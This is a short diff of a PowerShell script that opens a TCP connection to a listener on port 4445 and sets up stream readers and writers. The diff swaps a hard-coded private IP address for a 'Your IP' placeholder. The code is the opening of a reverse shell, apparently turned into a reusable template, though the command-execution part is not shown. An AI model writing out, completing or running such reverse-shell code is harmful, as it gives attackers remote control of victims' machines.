@@ -1,4 +1,4 @@
-$TCPClient = New-Object System.Net.Sockets.TCPClient('172.22.238.168', 4445)
+$TCPClient = New-Object System.Net.Sockets.TCPClient('Your IP', 4445)
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
 $StreamReader = New-Object System.IO.StreamReader($NetworkStream)
